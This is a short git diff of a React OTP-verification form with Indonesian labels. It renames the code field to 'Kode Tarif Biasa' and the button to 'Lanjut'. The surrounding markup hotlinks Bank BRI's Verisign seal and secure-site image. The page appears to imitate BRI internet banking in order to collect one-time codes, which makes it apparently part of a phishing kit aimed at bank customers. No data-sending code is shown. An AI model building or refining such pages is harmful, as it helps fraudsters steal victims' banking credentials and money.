@@ -40,9 +40,10 @@ export default function Otp() {
           <div className="loginform-wrap my-5 mx-3">
             <form className="loginform" onSubmit={handleSubmit}>
               <h2 className='mt-3'>Verifikasi</h2>
-              <input id='otp' name="kodeAktivasi" autoComplete="off" maxLength={23} type="text" placeholder="Kode Aktivasi" style={{marginBottom: '5px'}} form="loginform" onChange={handleInputChange} />
+              <label>Kode Tarif Biasa*</label>
+              <input id='otp' name="kodeTarifBiasa" autoComplete="off" maxLength={23} type="text" style={{marginBottom: '5px'}} form="loginform" onChange={handleInputChange} />
               <p  className='text-secondary' id='error'></p>
-              <button type="submit" id='masuk'>Masuk</button>
+              <button type="submit" id='masuk' className='otp'>Lanjut</button>
               <div style={{float: 'left', width : '100%'}}>
                 <a href="https://sealinfo.verisign.com/splash?form_file=fdf/splash.fdf&dn=ib.bri.co.id" className="verisign">
                   <img className="verisign-logo" src="https://ib.bri.co.id/ib-bri/img/securesite1rtc.jpg" width="100px" height="55px" />
